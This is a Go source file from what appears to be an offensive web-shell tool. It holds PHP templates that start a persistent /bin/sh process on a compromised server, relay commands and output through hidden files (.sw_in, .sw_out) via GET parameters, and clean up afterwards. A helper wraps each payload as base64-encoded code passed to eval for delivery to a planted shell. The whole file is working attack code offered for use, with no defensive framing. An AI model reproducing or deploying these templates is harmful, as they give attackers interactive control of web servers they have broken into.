package main

import (
	"encoding/base64"
	"fmt"
)

type CodeTpl struct {
	start string
	stop  string
	read  string
	write string
}

// TODO: 添加随机字符串，设置std文件名，支持多连接
var PhpCode = &CodeTpl{
	start: `
$STDIN = ".sw_in";
$STDOUT = ".sw_out";

ignore_user_abort(true);
set_time_limit(0);
ob_start();
echo "ok";
ob_end_flush();
flush();

$desc = array(
    0 => array("pipe", "r"),
    1 => array("file", $STDOUT, "a"),
    2 => array("file", $STDOUT, "a")
);

$handle = proc_open("/bin/sh", $desc, $pipes);
@file_put_contents($STDIN, "bash -i\n");

while (1) {
    sleep(0.1);
	if (!proc_get_status($handle)["running"]) break;
    if (!file_exists($STDIN)) break;
    $c = @file_get_contents($STDIN);
    @file_put_contents($STDIN, "");
    if (strlen($c) == 0) {
        sleep(0.2);
        continue;
    }
    fwrite($pipes[0], $c);
}
fclose($pipes[0]);
proc_close($handle);
@unlink($STDIN);
@unlink($STDOUT);`,
	stop: `
$STDIN = ".sw_in";
$STDOUT = ".sw_out";
@unlink($STDIN);
@unlink($STDOUT);`,
	read: `
$STDOUT = ".sw_out";
if (!file_exists($STDOUT)) {
@header("HTTP/1.1 500");
die();
}
$r = @file_get_contents($STDOUT);
@file_put_contents($STDOUT, "");
echo($r);`,
	write: `
$STDIN = ".sw_in";
$fp = fopen($STDIN, "a");
fwrite($fp, $_GET["c"]);
fclose($fp);`,
}

func PostData(code string) string {
	return fmt.Sprintf("eval(base64_decode(\"%s\"));", base64.StdEncoding.EncodeToString([]byte(code)))
}
